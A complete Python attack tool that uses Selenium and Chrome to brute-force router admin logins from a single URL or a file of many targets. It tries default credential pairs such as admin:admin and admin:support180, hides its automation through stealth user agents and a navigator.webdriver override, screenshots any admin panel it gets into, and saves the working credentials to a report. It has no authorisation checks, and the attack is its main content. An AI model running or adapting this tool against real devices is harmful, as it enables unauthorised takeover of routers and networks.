#!/usr/bin/env python3
"""
Router Brute Force Chrome - Clean Version
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Chrome-based brute force attack with visible browser and screenshot capture
ONLY: Brute Force + Admin Panel Screenshot
"""

import os
import sys
import time
import signal
import random
import argparse
import threading
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin
import warnings
warnings.filterwarnings('ignore')

# Try to import selenium libraries
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("Error: Selenium not available. Please install: pip install selenium")
    sys.exit(1)

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# User agents for stealth
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
]

class ChromeRouterBruteForce:
    def __init__(self, login_urls, timeout=10, headless=False, screenshot_dir="screenshots"):
        self.login_urls = login_urls if isinstance(login_urls, list) else [login_urls]
        self.timeout = timeout
        self.headless = headless
        self.screenshot_dir = screenshot_dir
        self.driver = None
        self.lock = threading.Lock()
        self.vulnerable_findings = []  # Store vulnerable findings
        
        # Rate limiting and session management
        self.request_delay = 3  # Delay between requests to avoid rate limiting
        self.session_timeout = 300  # Session timeout in seconds
        self.last_request_time = 0
        self.request_count = 0
        self.max_requests_per_minute = 20  # Maximum requests per minute
        
        # Create screenshot directory
        if not os.path.exists(self.screenshot_dir):
            os.makedirs(self.screenshot_dir)
    
    def rate_limit_check(self):
        """Check and enforce rate limiting to avoid blocking"""
        current_time = time.time()
        
        # Reset request count every minute
        if current_time - self.last_request_time > 60:
            self.request_count = 0
            self.last_request_time = current_time
        
        # Check if we've exceeded the rate limit
        if self.request_count >= self.max_requests_per_minute:
            wait_time = 60 - (current_time - self.last_request_time)
            if wait_time > 0:
                print(f"{Colors.YELLOW}[*] Rate limit reached, waiting {wait_time:.1f} seconds...{Colors.END}")
                time.sleep(wait_time)
                self.request_count = 0
                self.last_request_time = time.time()
        
        # Always add delay between requests
        time.sleep(self.request_delay)
        self.request_count += 1
    
    def check_session_validity(self):
        """Check if session is still valid"""
        try:
            if not self.driver:
                return False
            
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            # Check for session-related error messages
            session_errors = [
                'invalid session key', 'session expired', 'session timeout',
                'please try again', 'session invalid', 'authentication required',
                'login required', 'access denied', 'unauthorized'
            ]
            
            for error in session_errors:
                if error in page_source:
                    print(f"{Colors.RED}[!] Session error detected: {error}{Colors.END}")
                    return False
            
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error checking session: {e}{Colors.END}")
            return False
    
    def setup_chrome_driver(self):
        """Setup Chrome driver with cross-platform support"""
        try:
            chrome_options = Options()
            
            # Basic options
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
            chrome_options.add_argument('--disable-background-networking')
            chrome_options.add_argument('--disable-background-timer-throttling')
            chrome_options.add_argument('--disable-renderer-backgrounding')
            chrome_options.add_argument('--disable-backgrounding-occluded-windows')
            chrome_options.add_argument('--disable-ssl-error-handling')
            chrome_options.add_argument('--disable-features=TranslateUI')
            chrome_options.add_argument('--disable-ipc-flooding-protection')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # SSL and certificate handling
            chrome_options.add_experimental_option("prefs", {
                "profile.default_content_setting_values.notifications": 2,
                "profile.default_content_settings.popups": 0,
                "profile.managed_default_content_settings.images": 2
            })
            
            # Timeout and performance settings
            chrome_options.add_argument('--page-load-strategy=eager')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--memory-pressure-off')
            chrome_options.add_argument('--disable-hang-monitor')
            chrome_options.add_argument('--disable-prompt-on-repost')
            chrome_options.add_argument('--disable-domain-reliability')
            chrome_options.add_argument('--disable-component-extensions-with-background-pages')
            
            # Window size
            chrome_options.add_argument('--window-size=1920,1080')
            
            # User agent
            chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
            
            # Headless mode (if requested)
            if self.headless:
                chrome_options.add_argument('--headless')
            
            # Cross-platform Chrome driver setup
            if os.name == 'nt':  # Windows
                # Try to find ChromeDriver in common locations
                possible_paths = [
                    'chromedriver.exe',
                    'C:\\chromedriver\\chromedriver.exe',
                    'C:\\Program Files\\chromedriver\\chromedriver.exe',
                    'C:\\Program Files (x86)\\chromedriver\\chromedriver.exe'
                ]
                
                driver_path = None
                for path in possible_paths:
                    if os.path.exists(path):
                        driver_path = path
                        break
                
                if driver_path:
                    service = Service(driver_path)
                    self.driver = webdriver.Chrome(service=service, options=chrome_options)
                else:
                    self.driver = webdriver.Chrome(options=chrome_options)
            else:
                # Let Selenium find chromedriver automatically
                self.driver = webdriver.Chrome(options=chrome_options)
            
            # Execute script to remove webdriver property
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print(f"{Colors.GREEN}[+] Chrome driver initialized successfully{Colors.END}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to initialize Chrome driver: {e}{Colors.END}")
            print(f"{Colors.YELLOW}[!] Please ensure ChromeDriver is installed and in PATH{Colors.END}")
            return False
    
    def detect_login_form(self):
        """Detect login form fields"""
        try:
            username_field = None
            password_field = None
            
            # Common selectors for username/email fields
            username_selectors = [
                "input[name='username']", "input[name='user']", "input[name='login']",
                "input[name='email']", "input[name='account']", "input[name='userid']",
                "input[id='username']", "input[id='user']", "input[id='login']",
                "input[id='email']", "input[id='account']", "input[id='userid']",
                "input[type='text']", "input[type='email']", "input[placeholder*='user']",
                "input[placeholder*='email']", "input[placeholder*='login']"
            ]
            
            # Common selectors for password fields
            password_selectors = [
                "input[name='password']", "input[name='pass']", "input[name='passwd']",
                "input[name='pwd']", "input[id='password']", "input[id='pass']",
                "input[id='passwd']", "input[id='pwd']", "input[type='password']"
            ]
            
            # Try to find username field
            for selector in username_selectors:
                try:
                    element = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if element.is_displayed() and element.is_enabled():
                        username_field = element
                        break
                except:
                    continue
            
            # Try to find password field
            for selector in password_selectors:
                try:
                    element = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if element.is_displayed() and element.is_enabled():
                        password_field = element
                        break
                except:
                    continue
            
            # If not found with CSS selectors, try XPath
            if not username_field or not password_field:
                try:
                    # Try XPath for username
                    if not username_field:
                        username_field = self.driver.find_element(By.XPATH, "//input[contains(@name, 'user') or contains(@id, 'user') or contains(@placeholder, 'user')]")
                    
                    # Try XPath for password
                    if not password_field:
                        password_field = self.driver.find_element(By.XPATH, "//input[@type='password' or contains(@name, 'pass') or contains(@id, 'pass')]")
                        
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] XPath search failed: {e}{Colors.END}")
            
            return username_field, password_field
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error detecting login form: {e}{Colors.END}")
            return None, None
    
    def find_submit_button(self):
        """Find and return submit button"""
        try:
            submit_selectors = [
                "input[type='submit']", "button[type='submit']", "input[value*='Login']",
                "input[value*='Sign']", "button[value*='Login']", "button[value*='Sign']",
                "button:contains('Login')", "button:contains('Sign')", "button:contains('Submit')",
                "input[value='Login']", "input[value='Sign In']", "button[id*='login']",
                "button[id*='submit']", "button[class*='login']", "button[class*='submit']"
            ]
            
            for selector in submit_selectors:
                try:
                    element = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if element.is_displayed() and element.is_enabled():
                        return element
                except:
                    continue
            
            # Try XPath as fallback
            try:
                submit_button = self.driver.find_element(By.XPATH, "//input[@type='submit'] | //button[@type='submit'] | //button[contains(text(), 'Login')] | //button[contains(text(), 'Sign')]")
                if submit_button.is_displayed() and submit_button.is_enabled():
                    return submit_button
            except:
                pass
            
            return None
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error finding submit button: {e}{Colors.END}")
            return None
    
    def is_admin_panel_loaded(self):
        """Check if we're in admin panel with detailed verification"""
        try:
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            page_title = self.driver.title.lower()
            
            print(f"{Colors.BLUE}[*] Checking admin panel - URL: {current_url}{Colors.END}")
            print(f"{Colors.BLUE}[*] Page title: {self.driver.title}{Colors.END}")
            
            # Check for error pages
            error_indicators = ['this site can\'t be reached', 'site can\'t be reached', 'connection refused', 'timeout', 'error', 'not found', 'unavailable']
            if any(error in page_source for error in error_indicators):
                return False, "Error page detected"
            
            # Check for admin panel indicators (expanded list)
            admin_indicators = [
                'admin', 'administrator', 'dashboard', 'control panel', 'configuration', 
                'settings', 'system', 'status', 'network', 'router', 'gateway', 'modem',
                'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos',
                'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart',
                'main menu', 'welcome', 'logout', 'log out', 'management', 'monitor',
                'device', 'interface', 'port', 'service', 'security', 'advanced',
                'device info', 'system info', 'router info', 'gateway info',
                'home', 'overview', 'summary', 'statistics', 'traffic', 'bandwidth',
                'users', 'clients', 'connected devices', 'wifi', 'ethernet',
                'internet', 'connection', 'ip address', 'subnet', 'dns server',
                'time', 'date', 'timezone', 'language', 'theme', 'appearance',
                'broadband', 'adsl', 'cable', 'fiber', 'access point', 'switch',
                'broadcom', 'qualcomm', 'mediatek', 'realtek', 'cisco', 'netgear',
                'linksys', 'tp-link', 'd-link', 'asus', 'belkin', 'buffalo',
                'zyxel', 'huawei', 'zte', 'tenda', 'main', 'index', 'menu',
                'tools', 'utilities', 'diagnostics', 'logs', 'maintenance'
            ]
            
            # Check for login page indicators (negative)
            login_indicators = [
                'username', 'password', 'login', 'sign in', 'authentication', 'enter credentials',
                'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed',
                'error', 'denied', 'wrong', 'access denied', 'please login', 'enter username',
                'login form', 'password field', 'username field', 'submit', 'log in'
            ]
            
            # Check for specific success indicators
            success_indicators = [
                'logout', 'log out', 'welcome', 'dashboard', 'main menu', 'system status',
                'device status', 'network status', 'router status', 'admin panel',
                'device info', 'system info', 'router info', 'gateway info',
                'connected', 'online', 'active', 'running', 'operational'
            ]
            
            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
            login_count = sum(1 for indicator in login_indicators if indicator in page_source)
            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
            
            # Check if URL changed from login page
            url_changed = not any(login_term in current_url for login_term in ['login', 'signin', 'sign-in', 'auth', 'authentication'])
            
            print(f"{Colors.BLUE}[*] Analysis - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, URL changed: {url_changed}{Colors.END}")
            
            # More lenient success criteria for HTTP Basic Auth
            # If we have admin indicators and no login indicators, it's likely admin panel
            if admin_count >= 2 and login_count == 0:
                device_info = self.extract_device_info()
                return True, f"Admin panel detected - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            # More lenient criteria for form-based auth
            if admin_count >= 3 and login_count <= 2:
                device_info = self.extract_device_info()
                return True, f"Admin panel detected - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            # Original strict criteria
            if admin_count > login_count and admin_count >= 3 and success_count >= 1 and url_changed:
                device_info = self.extract_device_info()
                return True, f"Admin panel loaded - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            # If we have significant admin content and URL changed
            if admin_count >= 4 and url_changed and login_count <= 1:
                device_info = self.extract_device_info()
                return True, f"Admin panel detected (high admin content) - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            return False, f"Not admin panel - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, URL changed: {url_changed}"
            
        except Exception as e:
            return False, f"Error checking admin panel: {e}"
    
    def extract_device_info(self):
        """Extract device information from page content"""
        try:
            device_info = {}
            
            # Extract title
            if self.driver.title:
                device_info['title'] = self.driver.title
            
            # Extract footer info
            try:
                footer_elements = self.driver.find_elements(By.TAG_NAME, "footer")
                for footer in footer_elements:
                    footer_text = footer.text.lower()
                    if any(brand in footer_text for brand in ['cisco', 'netgear', 'linksys', 'tp-link', 'd-link', 'asus']):
                        device_info['footer'] = footer.text
                        break
            except:
                pass
            
            # Extract device info from common selectors
            device_selectors = [
                ".device-info", ".model", ".version", ".firmware", ".hardware",
                ".manufacturer", ".brand", ".router-info", ".gateway-info"
            ]
            
            for selector in device_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for element in elements:
                        if element.text.strip():
                            device_info[selector.replace('.', '').replace('-', '_')] = element.text.strip()
                except:
                    continue
            
            return device_info
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error extracting device info: {e}{Colors.END}")
            return {}
    
    def take_screenshot(self, url=None):
        """Take screenshot and save it"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Extract IP from URL if provided
            ip_address = "unknown"
            if url:
                try:
                    parsed_url = urlparse(url)
                    ip_address = parsed_url.hostname
                except:
                    pass
            
            filename = f"success_admin_panel_{ip_address}_{timestamp}.png"
            filepath = os.path.join(self.screenshot_dir, filename)
            
            # Take screenshot
            self.driver.save_screenshot(filepath)
            return filepath
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to take screenshot: {e}{Colors.END}")
            return None
    
    def add_vulnerable_finding(self, url, username, password, details):
        """Add vulnerable finding to list"""
        finding = {
            'url': url,
            'username': username,
            'password': password,
            'details': details,
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        self.vulnerable_findings.append(finding)
    
    def generate_report(self):
        """Generate final report"""
        if not self.vulnerable_findings:
            print(f"{Colors.GREEN}[+] No vulnerable credentials found - router appears secure{Colors.END}")
            return
        
        print(f"{Colors.RED}[!] VULNERABLE CREDENTIALS FOUND:{Colors.END}")
        for finding in self.vulnerable_findings:
            print(f"{Colors.RED}🔒 {finding['username']}:{finding['password']} - {finding['url']}{Colors.END}")
            print(f"{Colors.YELLOW}   Details: {finding['details']}{Colors.END}")
            print(f"{Colors.YELLOW}   Time: {finding['timestamp']}{Colors.END}")
            print()
        
        # Save to file
        report_file = f"vulnerable_findings_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, 'w') as f:
            f.write("VULNERABLE ROUTER CREDENTIALS REPORT\n")
            f.write("=" * 50 + "\n\n")
            for finding in self.vulnerable_findings:
                f.write(f"URL: {finding['url']}\n")
                f.write(f"Username: {finding['username']}\n")
                f.write(f"Password: {finding['password']}\n")
                f.write(f"Details: {finding['details']}\n")
                f.write(f"Time: {finding['timestamp']}\n")
                f.write("-" * 30 + "\n\n")
        
        print(f"{Colors.GREEN}[+] Report saved to: {report_file}{Colors.END}")
    
    def test_http_basic_auth(self, username, password, login_url):
        """Test HTTP Basic Authentication"""
        try:
            if not hasattr(self, 'driver') or not self.driver:
                return False, "Driver not initialized"
                
            parsed_url = urlparse(login_url)
            auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
            
            print(f"{Colors.BLUE}[*] Testing HTTP Basic Auth: {username}:{password}{Colors.END}")
            self.driver.get(auth_url)
            time.sleep(5)  # Wait longer for page to load completely
            
            # Check current URL and page content
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            print(f"{Colors.BLUE}[*] After Basic Auth - URL: {current_url}{Colors.END}")
            print(f"{Colors.BLUE}[*] Page title: {self.driver.title}{Colors.END}")
            
            # Check if admin panel is loaded
            is_admin, admin_details = self.is_admin_panel_loaded()
            
            if is_admin:
                # Take screenshot of admin panel
                screenshot_file = self.take_screenshot(login_url)
                if screenshot_file:
                    print(f"{Colors.GREEN}[+] Screenshot saved: {screenshot_file}{Colors.END}")
                
                # Add to vulnerable findings
                self.add_vulnerable_finding(login_url, username, password, admin_details)
                
                print(f"{Colors.GREEN}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                return True, f"Successfully logged in with {username}:{password}"
            else:
                print(f"{Colors.RED}[!] Basic Auth worked but not admin panel: {admin_details}{Colors.END}")
                return False, admin_details
                
        except Exception as e:
            return False, f"HTTP Basic Auth error: {e}"
    
    def test_form_based_auth(self, username, password, login_url):
        """Test form-based authentication"""
        try:
            print(f"{Colors.BLUE}[*] Testing Form-based Auth: {username}:{password}{Colors.END}")
            
            # Navigate to login page
            self.driver.get(login_url)
            time.sleep(3)
            
            # Clear cookies for fresh session
            self.driver.delete_all_cookies()
            
            # Find login form fields
            username_field, password_field = self.detect_login_form()
            
            if not username_field or not password_field:
                print(f"{Colors.YELLOW}[!] Could not find login form fields{Colors.END}")
                return False, "Could not find login form fields"
            
            # Fill in credentials
            username_field.clear()
            username_field.send_keys(username)
            time.sleep(1)
            
            password_field.clear()
            password_field.send_keys(password)
            time.sleep(1)
            
            # Find and click submit button
            submit_button = self.find_submit_button()
            if submit_button:
                submit_button.click()
            else:
                # Try pressing Enter
                password_field.send_keys("\n")
            
            # Wait for page to load
            time.sleep(5)
            
            # Check if admin panel is loaded
            is_admin, admin_details = self.is_admin_panel_loaded()
            
            if is_admin:
                # Take screenshot of admin panel
                screenshot_file = self.take_screenshot(login_url)
                if screenshot_file:
                    print(f"{Colors.GREEN}[+] Screenshot saved: {screenshot_file}{Colors.END}")
                
                # Add to vulnerable findings
                self.add_vulnerable_finding(login_url, username, password, admin_details)
                
                print(f"{Colors.GREEN}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                return True, f"Successfully logged in with {username}:{password}"
            else:
                print(f"{Colors.RED}[!] Form-based Auth failed: {admin_details}{Colors.END}")
                return False, admin_details
                
        except Exception as e:
            return False, f"Form-based Auth error: {e}"
    
    def detect_authentication_type(self, login_url):
        """Detect authentication type"""
        try:
            print(f"{Colors.BLUE}[*] Detecting auth type - URL: {login_url}{Colors.END}")
            
            # Navigate to login page
            self.driver.get(login_url)
            time.sleep(3)
            
            # Check for alerts
            try:
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                print(f"{Colors.YELLOW}[!] Alert detected: {alert_text}{Colors.END}")
                alert.accept()
            except:
                pass
            
            # Get page info
            page_title = self.driver.title
            page_source = self.driver.page_source.lower()
            
            print(f"{Colors.BLUE}[*] Page title: {page_title}{Colors.END}")
            
            # Check for empty title
            if not page_title or page_title.strip() == "":
                print(f"{Colors.YELLOW}[!] Page title is empty, trying to refresh...{Colors.END}")
                self.driver.refresh()
                time.sleep(3)
                page_title = self.driver.title
                print(f"{Colors.BLUE}[*] After refresh - Page title: {page_title}{Colors.END}")
            
            # Check for error pages
            error_indicators = [
                'this site can\'t be reached', 'site can\'t be reached', 'connection refused', 
                'timeout', 'error', 'not found', 'unavailable'
            ]
            
            if any(error in page_source for error in error_indicators):
                return "error", "Error page detected"
            
            # Check for HTTP Basic/Digest authentication
            try:
                import requests
                response = requests.get(login_url, timeout=10)
                if response.status_code == 401:
                    www_auth = response.headers.get('WWW-Authenticate', '').lower()
                    if 'basic' in www_auth:
                        return "basic", "HTTP Basic authentication detected"
                    elif 'digest' in www_auth:
                        return "digest", "HTTP Digest authentication detected"
            except:
                pass
            
            # Check for form-based authentication
            username_field, password_field = self.detect_login_form()
            if username_field and password_field:
                return "form", "Form-based authentication detected"
            
            # Check for JavaScript-based authentication
            if 'javascript' in page_source or 'ajax' in page_source:
                return "javascript", "JavaScript-based authentication detected"
            
            # Check for API-based authentication
            if 'api' in page_source or 'json' in page_source:
                return "api", "API-based authentication detected"
            
            # Check for redirect-based authentication
            if 'redirect' in page_source or 'location' in page_source:
                return "redirect", "Redirect-based authentication detected"
            
            # Check for cookie-based authentication
            if 'cookie' in page_source or 'session' in page_source:
                return "cookie", "Cookie-based authentication detected"
            
            # Default to form-based if we can't determine
            return "form", "Defaulting to form-based authentication"
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error detecting auth type: {e}{Colors.END}")
            return "error", f"Error detecting auth type: {e}"
    
    def test_credentials(self, login_url, username, password):
        """Test credentials with detected authentication type"""
        try:
            # Detect authentication type
            auth_type, auth_details = self.detect_authentication_type(login_url)
            print(f"{Colors.BLUE}[*] Authentication type: {auth_type} - {auth_details}{Colors.END}")
            
            if auth_type == "error":
                return False, auth_details
            
            # Test based on authentication type
            if auth_type == "basic":
                return self.test_http_basic_auth(username, password, login_url)
            elif auth_type == "form":
                return self.test_form_based_auth(username, password, login_url)
            else:
                # Try form-based as fallback
                return self.test_form_based_auth(username, password, login_url)
                
        except Exception as e:
            return False, f"Error testing credentials: {e}"
    
    def brute_force_single_url(self, login_url):
        """Brute force a single URL"""
        try:
            print(f"{Colors.CYAN}[*] ATTACKING: {login_url}{Colors.END}")
            
            # Define credentials to test
            credentials = [
                ("admin", "admin"),
                ("admin", "support180"),
                ("support", "support"),
                ("user", "user")
            ]
            
            for i, (username, password) in enumerate(credentials, 1):
                print(f"{Colors.BLUE}[{i}/4] Testing credential set {i}{Colors.END}")
                print(f"{Colors.BLUE}[>] Testing credentials: {username}:{password}{Colors.END}")
                
                # Test credentials
                success, details = self.test_credentials(login_url, username, password)
                
                if success:
                    print(f"{Colors.GREEN}[+] {username}:{password} successful!{Colors.END}")
                    print(f"{Colors.BLUE}[*] Found working credentials - stopping further tests for this URL{Colors.END}")
                    return True
                else:
                    print(f"{Colors.RED}[-] {username}:{password} failed{Colors.END}")
            
            return False
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error brute forcing {login_url}: {e}{Colors.END}")
            return False
    
    def quit(self):
        """Quit the browser"""
        if self.driver:
            self.driver.quit()

def parse_login_urls(url_input):
    """Parse login URLs from input (file or single URL)"""
    urls = []
    
    # Check if input is a file
    if os.path.isfile(url_input):
        try:
            with open(url_input, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        urls.append(line)
            print(f"{Colors.GREEN}[+] Loaded {len(urls)} URLs from file: {url_input}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading file {url_input}: {e}{Colors.END}")
            return []
    else:
        # Single URL
        urls = [url_input]
        print(f"{Colors.GREEN}[+] Target URL: {url_input}{Colors.END}")
    
    return urls

def main():
    parser = argparse.ArgumentParser(description="Router Brute Force Chrome - Clean Version")
    parser.add_argument("-u", "--url", required=True, help="Target URL or file containing URLs")
    parser.add_argument("--headless", action="store_true", help="Run in headless mode")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout for each request")
    parser.add_argument("--screenshot-dir", default="screenshots", help="Directory to save screenshots")
    
    args = parser.parse_args()
    
    # Parse URLs
    urls = parse_login_urls(args.url)
    if not urls:
        print(f"{Colors.RED}[!] No URLs to test{Colors.END}")
        return
    
    print(f"{Colors.BLUE}[*] Target credentials: admin:admin, admin:support180, support:support, user:user{Colors.END}")
    print(f"{Colors.BLUE}[*] Chrome-based brute force with visible browser{Colors.END}")
    print(f"{Colors.BLUE}[*] Workflow: Open Chrome → Navigate → Test Credentials → Screenshot{Colors.END}")
    
    if args.headless:
        print(f"{Colors.YELLOW}[!] Running in headless mode{Colors.END}")
    
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")
    print(f"{Colors.CYAN}[*] STARTING CHROME BRUTE FORCE ATTACK{Colors.END}")
    print(f"{Colors.CYAN}[*] Total URLs to test: {len(urls)}{Colors.END}")
    print(f"{Colors.CYAN}{'='*60}{Colors.END}")
    
    # Initialize brute force tool
    brute_force = ChromeRouterBruteForce(
        urls, 
        timeout=args.timeout, 
        headless=args.headless,
        screenshot_dir=args.screenshot_dir
    )
    
    try:
        # Setup Chrome driver
        if not brute_force.setup_chrome_driver():
            return
        
        # Test each URL
        for i, url in enumerate(urls, 1):
            print(f"{Colors.CYAN}[URL {i}/{len(urls)}] Processing: {url}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            success = brute_force.brute_force_single_url(url)
            
            if success:
                print(f"{Colors.GREEN}[+] VULNERABLE: {url}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}[*] SECURE: {url}{Colors.END}")
            
            print(f"{Colors.BLUE}[*] Progress: {i}/{len(urls)} URLs processed{Colors.END}")
            print()
        
        # Generate final report
        brute_force.generate_report()
        
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.CYAN}[+] BRUTE FORCE ATTACK COMPLETED{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")
        
        if brute_force.vulnerable_findings:
            print(f"{Colors.RED}[!] VULNERABLE CREDENTIALS FOUND!{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] No vulnerable credentials found - router appears secure{Colors.END}")
        
        print(f"{Colors.BLUE}[*] FINAL STATISTICS:{Colors.END}")
        print(f"{Colors.BLUE}   - Total URLs tested: {len(urls)}{Colors.END}")
        print(f"{Colors.BLUE}   - Vulnerable credentials found: {len(brute_force.vulnerable_findings)}{Colors.END}")
        print(f"{Colors.BLUE}   - Screenshots saved in: {args.screenshot_dir}{Colors.END}")
        
        if brute_force.vulnerable_findings:
            print(f"{Colors.RED}[!] Router is VULNERABLE - default credentials found!{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] Router appears secure - no default credentials found{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"{Colors.YELLOW}[!] Attack interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during attack: {e}{Colors.END}")
    finally:
        brute_force.quit()

if __name__ == "__main__":
    main()